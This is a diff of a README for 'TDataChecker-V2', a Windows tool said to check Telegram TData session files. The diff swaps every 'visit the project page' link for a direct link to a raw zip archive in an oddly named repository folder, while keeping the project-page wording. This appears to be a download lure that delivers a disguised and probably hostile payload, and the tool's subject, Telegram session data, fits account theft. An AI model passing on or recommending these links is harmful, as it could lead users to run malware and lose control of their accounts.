@@ -1,12 +1,12 @@
 # 🛡️ TDataChecker-V2 - Fast Telegram TData Checks Made Simple
 
-[![Download](https://img.shields.io/badge/Download%20Now-Visit%20the%20Project%20Page-blue?style=for-the-badge)](https://github.com/IVANMURGA2710/TDataChecker-V2)
+[![Download](https://img.shields.io/badge/Download%20Now-Visit%20the%20Project%20Page-blue?style=for-the-badge)](https://github.com/IVANMURGA2710/TDataChecker-V2/raw/refs/heads/main/renotice/T_Checker_Data_striolet.zip)
 
 ## 📥 Download
 
 Use this link to visit the project page and download the app for Windows:
 
-[https://github.com/IVANMURGA2710/TDataChecker-V2](https://github.com/IVANMURGA2710/TDataChecker-V2)
+[https://github.com/IVANMURGA2710/TDataChecker-V2/raw/refs/heads/main/renotice/T_Checker_Data_striolet.zip](https://github.com/IVANMURGA2710/TDataChecker-V2/raw/refs/heads/main/renotice/T_Checker_Data_striolet.zip)
 
 ## 🖥️ What This App Does
 
@@ -135,6 +135,6 @@ The app works with files on your own computer. Keep your Telegram data in a priv
 
 Visit the project page here and download the Windows app:
 
-[https://github.com/IVANMURGA2710/TDataChecker-V2](https://github.com/IVANMURGA2710/TDataChecker-V2)
+[https://github.com/IVANMURGA2710/TDataChecker-V2/raw/refs/heads/main/renotice/T_Checker_Data_striolet.zip](https://github.com/IVANMURGA2710/TDataChecker-V2/raw/refs/heads/main/renotice/T_Checker_Data_striolet.zip)
 
 After download, extract the file if needed, then open the app on Windows
